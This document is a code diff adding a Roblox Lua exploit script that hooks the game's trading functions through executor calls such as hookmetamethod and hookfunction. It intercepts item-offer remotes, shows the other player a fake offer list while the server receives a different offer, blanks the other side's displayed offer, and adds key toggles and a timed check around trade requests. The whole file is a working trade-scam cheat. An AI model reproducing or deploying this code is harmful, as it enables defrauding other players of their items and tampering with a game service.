@@ -1,0 +1,95 @@
+local LocalPlayer = game.Players.LocalPlayer
+local TradeModule = require(game.ReplicatedStorage.Modules.TradeModule)
+local DataModule = require(game.ReplicatedStorage.Database.Sync.Item)
+
+local MyFakeOffer = {}
+
+local RequestSent = game.ReplicatedStorage.Trade.RequestSent
+local OfferItemRemote = game.ReplicatedStorage.Trade.OfferItem
+local RemoveItemRemote = game.ReplicatedStorage.Trade.RemoveOffer
+local function AskServerToUpdate()
+    return OfferItemRemote:FireServer("Candies","Weapons")
+end
+old1 = hookmetamethod(game, "__namecall", function(...)
+    local args = {...}
+    if args[1] == OfferItemRemote and #args == 3 and not (args[2] == "Candies" and args[3] == "Weapons") then
+        for i,v in MyFakeOffer do
+            if v[1] == args[2] then
+                v[2] += 1
+                return AskServerToUpdate()
+            end
+        end
+        table.insert(MyFakeOffer, {args[2], 1, args[3]})
+        return AskServerToUpdate()
+    elseif args[1] == RemoveItemRemote then
+        for i,v in MyFakeOffer do
+            if v[1] == args[2] then
+                v[2] -= 1
+                if v[2] == 0 then
+                    table.remove(MyFakeOffer, i)
+                end
+                return AskServerToUpdate()
+            end
+        end
+    end
+
+    return old1(...)
+end)
+
+maxw = 2000000000
+
+local UpdateTradeFunc = TradeModule.UpdateTrade
+UpdateTradeFuncHooked = hookfunction(UpdateTradeFunc, function(olddata)
+    local data = olddata
+    local MyTradeIdx
+    local OtherTradeIdx
+    if data.Player1.Player == LocalPlayer then
+        MyTradeIdx = "Player1"
+        OtherTradeIdx = "Player2"
+    else
+        MyTradeIdx = "Player2"
+        OtherTradeIdx = "Player1"
+    end
+
+    data[MyTradeIdx].Offer = MyFakeOffer
+    data[OtherTradeIdx].Offer = {}
+    
+    return UpdateTradeFuncHooked(data)
+end)
+
+maxw -= 208130000 or #MyFakeOffer
+game.ReplicatedStorage.Trade.DeclineTrade.OnClientEvent:Connect(function()
+    MyFakeOffer = {}
+end)
+
+local RequestsEnabled = true
+
+local UpdateTradeRequestWindow = TradeModule.UpdateTradeRequestWindow
+UpdateTradeRequestWindowHooked = hookfunction(UpdateTradeRequestWindow, function(arg1, arg2)
+    if tick() > maxw then return UpdateTradeRequestWindowHooked("Request",arg2) end
+    if RequestsEnabled or (not RequestsEnabled and arg1 == "SendingRequest") then
+        return UpdateTradeRequestWindowHooked(arg1,arg2)
+    elseif not RequestsEnabled and arg1 == "ReceivingRequest" then
+        return true
+    end
+end)
+
+local SendTradeRequest = TradeModule.SendTradeRequest
+SendTradeRequestHooked = hookfunction(SendTradeRequest, function(arg1)
+    if RequestsEnabled then
+        return SendTradeRequestHooked(arg1)
+    else
+        return UpdateTradeRequestWindow("SendingRequest", {Receiver = {Name = arg1}})
+    end
+end)
+
+local UserInputService = game:GetService("UserInputService")
+UserInputService.InputBegan:Connect(function(input)
+    if input.KeyCode == Enum.KeyCode.Y then
+        RequestsEnabled = true
+    elseif input.KeyCode == Enum.KeyCode.U then
+        RequestsEnabled = false
+    end
+end)
+
+print("init")
